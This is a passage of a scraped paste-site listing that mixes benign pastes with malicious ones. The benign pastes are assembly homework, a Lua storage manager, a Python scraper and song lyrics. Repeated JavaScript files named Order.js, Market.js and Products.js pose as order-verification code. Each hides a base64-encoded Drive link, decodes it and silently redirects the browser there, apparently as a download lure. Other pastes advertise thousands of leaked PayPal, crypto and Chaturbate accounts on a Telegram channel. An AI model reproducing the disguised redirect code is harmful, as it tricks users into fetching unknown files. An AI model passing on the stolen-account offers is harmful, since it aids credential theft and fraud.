    '254ff24c29771c22353d7ac449a28385',
    '198a48a1e94ee7b761155acb1a61dfbb',
    'af149a5a9ffbfa7d53791bac1f798e58',
    'cc7756c08b7fda542fe6d6b86d47af41',
    '8c0eae30226d6ba67bd333795ee71a7e',
    '846508e89cf7d317f8b50f4976f01574'
  ]
}"
Trxz244q,Order.js,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 05:57:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25859/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
g9DR2nt2,PayPal with Balance,Epiphemeral,JavaScript,Friday 2nd of May 2025 05:57:31 AM CDT,71884 Accounts Posted On https://t.me/leakzbyeminem
9xVicwSr,Untitled,Artychenal,6502 TASM/64TASS,Friday 2nd of May 2025 05:53:30 AM CDT,"DATA SEGMENT
    msg_input       DB ""Enter value (from -32768 to 65488): $""    ; Повідомлення для введення числа
    input_buffer    DB 7,?, 7 DUP ("" "")                           ; Буфер для введення даних
    msg_output      DB ""Result (input value + 47): $""             ; Повідомлення для виводу результату
    newline         DB 0Dh,0Ah,""$""                                ; Символ нового рядка
    msg_error       DB ""Invalid input!$""                          ; Повідомлення про помилку
    msg_range_error DB ""Value is out of range!$""                  ; Повідомлення про вихід за межі
    number          DW ?                                          ; Змінна для збереження числа
    is_negative     DB 0                                          ; Флаг знаку (0 - додатне, 1 - від'ємне)
DATA ENDS

STACK_SEG SEGMENT PARA STACK ""STACK""
              DB 64 DUP(""STACK"")
STACK_SEG ENDS

CODE SEGMENT
                          ASSUME CS:CODE, DS:DATA, SS:STACK_SEG

    START:                
                          MOV    AX, DATA
                          MOV    DS, AX

                          CALL   PRINT_PROMPT                      ; Вивід повідомлення для введення
                          CALL   VALIDATE_INPUT                    ; Перевірка коректності введеного числа

                          MOV    SI, OFFSET input_buffer + 2
                          XOR    BX, BX                            ; Обнуляємо BX для збереження числа
                          XOR    DX, DX                            ; Обнуляємо DX
                          CLD                                      ; Скидаємо прапор напрямку
                          MOV    is_negative, 0                    ; Ініціалізуємо флаг знаку

                          MOV    AL, [SI]
                          CMP    AL, '-'
                          JNE    CONVERT_TO_NUMBER
                          MOV    is_negative, 1                    ; Позначаємо число як від'ємне
                          INC    SI                                ; Пропускаємо знак мінус

    CONVERT_TO_NUMBER:    
                          MOV    AL, [SI]
                          CMP    AL, '0'
                          JB     END_CONVERSION                    ; Якщо символ менший за '0', вихід
                          CMP    AL, '9'
                          JA     END_CONVERSION                    ; Якщо символ більший за '9', вихід

                          SUB    AL, '0'                           ; Перетворення ASCII в число
                          MOV    AH, 0

                          PUSH   AX
                          MOV    AX, BX
                          MOV    CX, 10
                          MUL    CX
                          CMP    DX, 0
                          JNE    OVERFLOW_ERROR                    ; Перевірка переповнення
                          MOV    BX, AX
                          POP    AX                                ; Відновлюємо цифру
                          ADD    BX, AX

                          INC    SI
                          JMP    CONVERT_TO_NUMBER

    OVERFLOW_ERROR:       
                          CALL   PRINT_NEWLINE
                          MOV    DX, OFFSET msg_range_error
                          MOV    AH, 9
                          INT    21h
                          JMP    START

    END_CONVERSION:       
                          MOV    number, BX
                          CMP    is_negative, 1
                          JNE    ADD_OFFSET
                          CALL   CHECK_RANGE
                          NEG    number                            ; Робимо число від'ємним

    ADD_OFFSET:           
                          ADD    number, 47                        ; Додаємо зміщення
                          JC     OVERFLOW_ERROR
                          CMP    number, -1
                          JLE    PRINT_RESULT
                          CALL   RESET_SIGN_FLAG

    PRINT_RESULT:         
                          CALL   PRINT_NEWLINE
                          MOV    DX, OFFSET msg_output
                          MOV    AH, 9
                          INT    21h

                          CMP    is_negative, 0
                          JNE    PRINT_NEGATIVE
                          CMP    number, 0
                          JAE    PRINT_NUMBER

    PRINT_NEGATIVE:       
                          MOV    DL, '-'
                          MOV    AH, 2
                          INT    21h
                          NEG    number

    PRINT_NUMBER:         
                          MOV    AX, number
                          CALL   DISPLAY_NUMBER

                          MOV    AH, 4Ch
                          INT    21h

RESET_SIGN_FLAG PROC
                          MOV    is_negative, 0
                          RET
RESET_SIGN_FLAG ENDP

DISPLAY_NUMBER PROC
                          PUSH   number
                          PUSH   CX
                          PUSH   DX
                          XOR    CX, CX
                          MOV    number, 10

    TO_STRING:            
                          XOR    DX, DX
                          DIV    number
                          ADD    DL, '0'
                          PUSH   DX
                          INC    CX
                          TEST   AX, AX
                          JNZ    TO_STRING

    PRINT_DIGITS:         
                          POP    DX
                          MOV    AH, 2
                          INT    21h
                          LOOP   PRINT_DIGITS

                          POP    DX
                          POP    CX
                          POP    number
                          RET
DISPLAY_NUMBER ENDP

VALIDATE_INPUT PROC
                          MOV    SI, OFFSET input_buffer + 2
                          MOV    CL, [input_buffer + 1]
                          MOV    BL, 0
                          MOV    AL, [SI]
                          CMP    AL, '-'
                          JNE    CHECK_NUMBERS
                          INC    SI
                          DEC    CX
                          JZ     INPUT_ERROR

    CHECK_NUMBERS:        
                          MOV    AL, [SI]
                          CMP    CX, 0
                          JZ     END_VALIDATION

    CHECK_LOOP:           
                          MOV    AL, [SI]
                          CMP    AL, '0'
                          JB     INPUT_ERROR
                          CMP    AL, '9'
                          JA     INPUT_ERROR

                          INC    BL
                          INC    SI
                          DEC    CX
                          JNZ    CHECK_LOOP

                          CMP    BL, 0
                          JZ     INPUT_ERROR
                          JMP    END_VALIDATION

    INPUT_ERROR:          
                          MOV    DX, OFFSET msg_error
                          MOV    AH, 9
                          INT    21h
                          JMP    ERROR_EXIT

    ERROR_EXIT:           
                          JMP    START

    END_VALIDATION:       
                          RET
VALIDATE_INPUT ENDP

CHECK_RANGE PROC
                          MOV    AX, number
                          CMP    is_negative, 0
                          JB     CHECK_POSITIVE_LIMITS
                          CMP    AX, -32768
                          JA     RANGE_ERROR
                          CMP    AX, 32721
                          JG     RANGE_ERROR
                          RET

    CHECK_POSITIVE_LIMITS:
                          CMP    AX, 0
                          JL     RANGE_ERROR
                          CMP    AX, 65488
                          JA     RANGE_ERROR
                          RET

    RANGE_ERROR:          
                          CALL   PRINT_NEWLINE
                          MOV    DX, OFFSET msg_range_error
                          MOV    AH, 9
                          INT    21h
                          JMP    START
CHECK_RANGE ENDP

PRINT_PROMPT PROC
                          MOV    DX, OFFSET msg_input
                          MOV    AH, 9
                          INT    21h

                          MOV    DX, OFFSET input_buffer
                          MOV    AH, 10
                          INT    21h
                          RET
PRINT_PROMPT ENDP

PRINT_NEWLINE PROC
                          MOV    DX, OFFSET newline
                          MOV    AH, 9
                          INT    21h
                          RET
PRINT_NEWLINE ENDP

CODE ENDS
END START"
wngmYPW6,Market.js,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 05:42:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/07314/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gq5PHW48,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Friday 2nd of May 2025 05:42:09 AM CDT,35672 Accounts Posted On https://t.me/leakzbyeminem
wngsBEP2,Main Storage Management,Blackhome,Lua,Friday 2nd of May 2025 05:41:11 AM CDT,"-- Storage System Manager
-- By ChatGPT, structured for modular expansion

-- === CONFIG ===
local DISK_NAMES = {
    incoming = ""Incoming Task"",
    user = ""User Task"",
    outgoing = ""Outgoing Task"",
    finished = ""Finished Task"",
    settings = ""Settings"",
    storage = ""Data Storage"",
    init = ""Turtle Initializing""
}

local TASK_DATA = {
    currentTasks = {},
    emptyChests = {},
    storedItems = {},
    completedTasks = {},
    totalChestCount = 0,
    outgoingTask = nil
}

local SYSTEM_STATE = {
    chestInitialized = false,
    waitingForChestPlacement = false,
    orientation = nil,
    orientationDirection = 1,
    startCoords = nil,
    endCoords = nil,
    modulo = nil
}

local taskIdCounter = 1
local currentTaskSourceIndex = 1
local TASK_SOURCES = {""incoming"", ""user"", ""settings""}  -- disk name keys

-- === UTILITIES ===
function getDiskByLabel(label)
    for _, side in ipairs(peripheral.getNames()) do
        if peripheral.getType(side) == ""drive"" then
            local disk = peripheral.wrap(side)
            if disk.getDiskLabel() == label then
                return disk, disk.getMountPath()
            end
        end
    end
    return nil, nil
end

function saveTableToDisk(tableData, filename)
    local disk, path = getDiskByLabel(DISK_NAMES.storage)
    if not path then error(""Data Storage disk not found"") end
    local fullPath = fs.combine(path, filename)
    local file = fs.open(fullPath, ""w"")
    file.write(textutils.serialize(tableData))
    file.close()
end

function loadTableFromDisk(filename)
    local disk, path = getDiskByLabel(DISK_NAMES.storage)
    if not path then return {} end
    local fullPath = fs.combine(path, filename)
    if not fs.exists(fullPath) then return {} end
    local file = fs.open(fullPath, ""r"")
    local data = textutils.unserialize(file.readAll())
    file.close()
    return data or {}
end

function loadTaskIdCounter()
    local disk, path = getDiskByLabel(DISK_NAMES.storage)
    if not path then return 1 end
    local fullPath = fs.combine(path, ""taskIdCounter.txt"")
    if fs.exists(fullPath) then
        local file = fs.open(fullPath, ""r"")
        local id = tonumber(file.readLine())
        file.close()
        return id or 1
    end
    return 1
end

function saveTaskIdCounter()
    local disk, path = getDiskByLabel(DISK_NAMES.storage)
    if not path then error(""Data Storage disk not found for saving taskIdCounter"") end
    local fullPath = fs.combine(path, ""taskIdCounter.txt"")
    local file = fs.open(fullPath, ""w"")
    file.writeLine(tostring(taskIdCounter))
    file.close()
end


function saveTaskToDisk(taskType, contentTable)
    local disk, path = getDiskByLabel(DISK_NAMES.outgoing)
    if not path then error(""Outgoing Task disk not found"") end

    local tasksPath = fs.combine(path, ""tasks"")
    if not fs.exists(tasksPath) then fs.makeDir(tasksPath) end

    local filename = taskType .. ""_"" .. tostring(taskIdCounter)
    local fullPath = fs.combine(tasksPath, filename .. "".txt"")
    local file = fs.open(fullPath, ""w"")
    for k, v in pairs(contentTable) do
        file.writeLine(k .. ""="" .. tostring(v))
    end
    file.writeLine(""taskType="" .. taskType)
    file.writeLine(""taskId="" .. tostring(taskIdCounter))
    file.close()

    contentTable.taskId = taskIdCounter
    contentTable.taskType = taskType
    table.insert(TASK_DATA.currentTasks, contentTable)
    saveTableToDisk(TASK_DATA.currentTasks, ""currentTasks.txt"")
    taskIdCounter = taskIdCounter + 1
    saveTaskIdCounter()
end



-- === INITIALIZATION ===
function waitForInitialSettings()
    print(""Waiting for settings..."")
    local _, path = getDiskByLabel(DISK_NAMES.settings)
    while not path do sleep(1) path = select(2, getDiskByLabel(DISK_NAMES.settings)) end

    local settingsPath = fs.combine(path, ""initial_coords.txt"")
    while not fs.exists(settingsPath) do sleep(1) end

    local file = fs.open(settingsPath, ""r"")
    local x1, y1, z1 = file.readLine():match(""(-?%d+),(-?%d+),(-?%d+)"")
    local x2, y2, z2 = file.readLine():match(""(-?%d+),(-?%d+),(-?%d+)"")
    file.close()

    SYSTEM_STATE.startCoords = {x=tonumber(x1), y=tonumber(y1), z=tonumber(z1)}
    SYSTEM_STATE.endCoords = {x=tonumber(x2), y=tonumber(y2), z=tonumber(z2)}

    determineOrientation(SYSTEM_STATE.startCoords, SYSTEM_STATE.endCoords)
end

function determineOrientation(startPos, endPos)
    if startPos.x ~= endPos.x then
        SYSTEM_STATE.orientation = ""x""
        SYSTEM_STATE.orientationDirection = (endPos.x - startPos.x > 0) and 1 or -1
        SYSTEM_STATE.modulo = (startPos.z + 2 * SYSTEM_STATE.orientationDirection) % 8
    elseif startPos.z ~= endPos.z then
        SYSTEM_STATE.orientation = ""z""
        SYSTEM_STATE.orientationDirection = (endPos.z - startPos.z > 0) and 1 or -1
        SYSTEM_STATE.modulo = (startPos.x + 2 * SYSTEM_STATE.orientationDirection) % 8
    else
        SYSTEM_STATE.orientation = ""unknown""
        SYSTEM_STATE.orientationDirection = 1
        SYSTEM_STATE.modulo = 0
    end

    local disk, path = getDiskByLabel(DISK_NAMES.init)
    if path then
        local file = fs.open(fs.combine(path, ""init.txt""), ""w"")
        file.writeLine(""orientation="" .. SYSTEM_STATE.orientation)
        file.writeLine(""direction="" .. tostring(SYSTEM_STATE.orientationDirection))
        file.writeLine(""modulo="" .. tostring(SYSTEM_STATE.modulo))
        file.close()
    end
end

function createChestInitializationTask(coords)
    if #TASK_DATA.emptyChests == 0 then
        SYSTEM_STATE.waitingForChestPlacement = true
    end
    local taskContent = {task=""create_chests"", x=coords.x, y=coords.y, z=coords.z}
    saveTaskToDisk(""create_chests"", taskContent)
end

function initializeChestList(coords)
    print(""Initializing chest list..."")
    for row = 0, 4 do
        for col = 0, 9 do
            local offsetX = SYSTEM_STATE.orientation == ""x"" and col * SYSTEM_STATE.orientationDirection or 0
            local offsetZ = SYSTEM_STATE.orientation == ""z"" and col * SYSTEM_STATE.orientationDirection or 0
            local chestPos = {
                x = coords.x + offsetX,
                y = coords.y + row,
                z = coords.z + offsetZ
            }
            TASK_DATA.totalChestCount = TASK_DATA.totalChestCount + 1
            table.insert(TASK_DATA.emptyChests, {id = TASK_DATA.totalChestCount, pos = chestPos})
        end
    end
    SYSTEM_STATE.chestInitialized = true
    SYSTEM_STATE.waitingForChestPlacement = false
    saveTableToDisk(TASK_DATA.emptyChests, ""emptyChests.txt"")
    saveTableToDisk({count = TASK_DATA.totalChestCount}, ""totalChestCount.txt"")
end

function checkForCompletedTasks()
    local _, path = getDiskByLabel(DISK_NAMES.finished)
    if not path then return end
    local finishedPath = fs.combine(path, ""tasks"")
    if not fs.exists(finishedPath) then return end

    for _, file in ipairs(fs.list(finishedPath)) do
        local taskType, taskIdStr = file:match(""^(create_chests)_(%d+)%.txt$"")
        local taskId = tonumber(taskIdStr)

        if taskType and taskId then
            fs.delete(fs.combine(finishedPath, file))

            local matchedTask = nil
            local matchedIndex = nil
            for i, task in ipairs(TASK_DATA.currentTasks) do
                if task.taskType == taskType and task.taskId == taskId then
                    matchedTask = task
                    matchedIndex = i
                    break
                end
            end

            if matchedTask then
                initializeChestList({x=tonumber(matchedTask.x), y=tonumber(matchedTask.y), z=tonumber(matchedTask.z)})
                table.insert(TASK_DATA.completedTasks, matchedTask)
                table.remove(TASK_DATA.currentTasks, matchedIndex)
                saveTableToDisk(TASK_DATA.currentTasks, ""currentTasks.txt"")
                saveTableToDisk(TASK_DATA.completedTasks, ""completedTasks.txt"")
            end
        end
    end
end


function handleIncomingTask() end
function handleUserTask() end
function handleSettingsTask() end
function handleChestCreationTask() end

local handlerMap = {
    incoming = handleIncomingTask,
    user = handleUserTask,
    settings = handleSettingsTask
}

-- === START ===
TASK_DATA.currentTasks = loadTableFromDisk(""currentTasks.txt"")
TASK_DATA.emptyChests = loadTableFromDisk(""emptyChests.txt"")
TASK_DATA.storedItems = loadTableFromDisk(""storedItems.txt"")
TASK_DATA.completedTasks = loadTableFromDisk(""completedTasks.txt"")
local chestCountData = loadTableFromDisk(""totalChestCount.txt"")
TASK_DATA.totalChestCount = chestCountData.count or 0
taskIdCounter = loadTaskIdCounter()

if #TASK_DATA.emptyChests == 0 and not SYSTEM_STATE.chestInitialized then
    waitForInitialSettings()
    local _, settingsPath = getDiskByLabel(DISK_NAMES.settings)
    local settingsTaskFile = fs.combine(settingsPath, ""task.txt"")
    if fs.exists(settingsTaskFile) then
        createChestInitializationTask(SYSTEM_STATE.startCoords)
    else
        initializeChestList(SYSTEM_STATE.startCoords)
    end
end

-- === MAIN LOOP ===
while true do
    checkForCompletedTasks()

    if SYSTEM_STATE.waitingForChestPlacement then
        -- actively check settings disk for new create_chests task
        handlerMap.settings()
    elseif #TASK_DATA.emptyChests == 0 then
        SYSTEM_STATE.waitingForChestPlacement = true
    else
        local sourceKey = TASK_SOURCES[currentTaskSourceIndex]
        handlerMap[sourceKey]()

        currentTaskSourceIndex = currentTaskSourceIndex + 1
        if currentTaskSourceIndex > #TASK_SOURCES then
            currentTaskSourceIndex = 1
        end
    end

    sleep(1)
end
"
Nc9msD48,Untitled,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 05:26:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/86908/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zRH0TRLg,Chaturbate with Tokens,Epiphemeral,JavaScript,Friday 2nd of May 2025 05:26:46 AM CDT,99555 Accounts Posted On https://t.me/leakzbyeminem
ukyKG1wa,q3_solution,Thrist00w,Python,Friday 2nd of May 2025 05:18:37 AM CDT,"import requests
from bs4 import BeautifulSoup
import os
import json

url = 'https://en.wikipedia.org/wiki/ASEAN'
filename = 'urban_areas.json'

response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')

table = soup.find('table', class_='sortable wikitable plainrowheaders')

countries_dictionary = {}

for row in table.find_all('tr')[1:]:
    cols = row.find_all('td')
    city = row.find('th').text.strip()

    population = int(cols[0].text.strip().replace(',', ''))
    area = float(cols[1].text.strip().replace(',', ''))
    country = cols[2].text.strip()

    city_data = {
        'City': city,
        'Population': population,
        'Area (km²)': area,
        'Population Density': round(population / area, 2) if area else None,
    }

    countries_dictionary.setdefault(country, []).append(city_data)

if os.path.exists(filename):
    with open(filename, 'r') as file:
        existing_data = json.load(file)
else:
    existing_data = {}

if existing_data != countries_dictionary:
    with open(filename, 'w') as file:
        json.dump(countries_dictionary, file, indent=1)

"
7LKcXCwz,Products.js,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 05:11:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98703/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KNafwqeJ,Crypto Accounts,Epiphemeral,JavaScript,Friday 2nd of May 2025 05:11:23 AM CDT,80349 Accounts Posted On https://t.me/leakzbyeminem
ypRiEbsL,От героев былых времён (разметка),Lillgrinn,INI file,Friday 2nd of May 2025 05:04:42 AM CDT,"[Interlude: quiet percussion rhytm]

[Verse 1]
От героев былых времён не осталось порой имён, —
Те, кто приняли смертный бой, стали просто землёй и травой.
Только грозная доблесть их  поселилась в сердцах живых.
Этот вечный огонь, -- нам завещанный одним...
МЫ, в груди храним...

[Interlude 2/4 times]

[Verse 2]
Погляди на моих бойцов -- целый свет помнит их в лицо.
Вот застыл батальон в строю -- снова старых друзей узнаю...
Хоть им нет двадцати пяти — трудный путь им пришлось пройти.
Это те, кто в штыки... поднимался, как один...
ТЕ, кто брал Берлин.

[Crying interlude 2/4 times, short trumpet solo]

[Verse 3: legato]
Нет в России семьи такой, где б не памятен был свой герой...
И глаза молодых солдат, с фотографий увядших глядят.
Этот взгляд, словно Высший Суд, для ребят, что сейчас растут.
И мальчишкам нельзя, Ни солгать, ни обмануть!
Ни с пути свернуть!

[epic]
И мальчишкам нельзя! Ни солгать, ни обмануть!
Ни с пути свернуть!

[FADE OUT: percussion fade out]"
shnumX5J,KAR - Tempura Lua,maziari,Lua,Friday 2nd of May 2025 04:59:42 AM CDT,"function onScriptStart()
end
 
function onScriptCancel()
    MsgBox(""Script ended."")
end

function onScriptUpdate()
    TempuraCount = 0
    text = """"

    p_ItemList = ReadValue32(0x812BBC54)
    --p_ItemList = ReadValue32(0x812AB108)
    
    Addr = p_ItemList
    
    while Addr ~= 0 do
        if Addr == 0 then
            goto continue
        end
        p_Next = ReadValue32(Addr+8)
        p_Prev = ReadValue32(Addr+12)
        p_Item = ReadValue32(Addr+44)
        text = text..string.format(""\n Addr : %08X, Next : %08X, Prev : %08X, Item : %08X, "", Addr, p_Next, p_Prev, p_Item)

        if p_Item ~= 0 then
            ItemNum = ReadValue32(p_Item+28)
	    --ItemX = ReadValueFloat(p_Item+220)
	    --ItemY = ReadValueFloat(p_Item+224)
	    --ItemZ = ReadValueFloat(p_Item+228)

            --text = text..string.format(""%02X, %.3f, %.3f, %.3f"", ItemNum, ItemX, ItemY, ItemZ)
            text = text..string.format(""%02X"", ItemNum)

            if ItemNum == 0x31 then
                text = text.."" !!TEMPURA!!""
                TempuraCount = TempuraCount + 1
            end
        end

        Addr = p_Next
    end

    ::continue::
    
    text=text..string.format(""\nTEMPURA : %d"", TempuraCount)

    SetScreenText(text)
end"
G3KwyCTT,2025-05-02T10:59:34.813640,powerampache,PHP,Friday 2nd of May 2025 04:59:35 AM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 Not Found
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

"
y1HkiH96,Order.js,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 04:56:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21710/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DSqEu4QT,PayPal with Balance,Epiphemeral,JavaScript,Friday 2nd of May 2025 04:56:00 AM CDT,55061 Accounts Posted On https://t.me/leakzbyeminem
EhCv52bJ,Market.js,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 04:40:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28952/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fZp8Rnmd,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Friday 2nd of May 2025 04:40:39 AM CDT,03501 Accounts Posted On https://t.me/leakzbyeminem
NEi8AFKR,Untitled,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 04:25:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92469/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mfuHwKbK,Chaturbate with Tokens,Epiphemeral,JavaScript,Friday 2nd of May 2025 04:25:16 AM CDT,10882 Accounts Posted On https://t.me/leakzbyeminem
N0kHDFqT,Crypto Accounts,Epiphemeral,JavaScript,Friday 2nd of May 2025 04:09:54 AM CDT,81026 Accounts Posted On https://t.me/leakzbyeminem
sUVcenhV,Untitled,kammex,JavaScript,Friday 2nd of May 2025 04:09:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69039/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

